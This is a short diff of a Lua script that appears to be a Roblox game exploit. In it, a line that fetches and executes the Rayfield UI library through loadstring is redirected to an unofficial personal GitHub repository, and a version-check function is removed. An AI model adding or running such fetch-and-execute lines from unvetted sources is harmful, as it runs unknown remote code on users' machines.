@@ -77,7 +77,7 @@ local lightbit = 0.3125
 local lightbitoffset = 1
 local lightbitradius = 20
 local usingradius = lightbitradius
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Rayfield  = loadstring(game:HttpGet("https://raw.githubusercontent.com/yunjun3737-ship-it/-/main/Rayfield"))()
 local Player = game.Players.LocalPlayer
 --[[
     Utilities.IsDescendantOf(child, parent)
@@ -207,20 +207,6 @@ local function cleanupConnections(connectionTable)
     connectionTable = {}
 end
 
-local function getVersion()
-    local url = "https://raw.githubusercontent.com/Undebolted/FTAP/main/VERSION.json"
-    local success, response = pcall(function()
-        return game:HttpGet(url)
-    end)
-
-    if success then
-        local data = HttpService:JSONDecode(response)
-        return data.version
-    else
-        warn("Failed to get version: " .. response)
-        return "Unknown"
-    end
-end
 
 local function spawnItem(itemName, position, orientation)
     task.spawn(function()
